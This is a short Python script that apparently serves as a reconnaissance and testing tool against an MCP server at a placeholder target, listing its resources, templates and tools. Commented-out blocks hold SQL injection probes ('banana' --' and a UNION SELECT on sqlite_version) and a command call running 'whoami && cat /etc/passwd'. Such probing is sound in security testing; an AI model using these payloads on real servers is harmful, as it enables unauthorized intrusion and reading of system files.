import asyncio
from fastmcp import Client, FastMCP

client = Client("http://{target}/")

async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources:")
        for resource in resources:
            print("=" * 40)
            print(resource)

            if hasattr(resource, "uri"):
                print("URI:", resource.uri)

            if hasattr(resource, "name"):
                print("Name:", resource.name)

            if hasattr(resource, "description"):
                print("Description:", resource.description)
            

        print("-"*50)
        print("Resource Templates:")
        for resource_template in resource_templates:
            print('***')
            print(resource_template.uriTemplate)
            print(resource_template.description.strip())
            

        print("-"*50)
        print("Tools:")
        for tool in tools:
            print('***')
            params = list(tool.inputSchema.get('properties').keys())
            print(f"{tool.name}({','.join(params)})")
            print(tool.description.strip())
            print("-"*50)
            
            
    
        """  Testing the quantity
             
        try:
            result_object = await client.read_resource("quantity://banana' --")
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")
            print("-"*50)
            
        """
        
            
        """ Testing the price resource
        
            
        try:
            result_object = await client.read_resource("price://x'%20UNION%20SELECT%20sqlite_version()--")
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")
            print("-"*50)
            
        """ 
            
        """ Testing the command tool
        
            
        try:
            result_object = await client.call_tool("execute_server_command", {"command": "whoami && cat /etc/passwd"})
            print(result_object.content[0].text)
        except Exception as e:
            print(f"[-] {e}")
            print("-"*50)
            
        """

asyncio.run(main())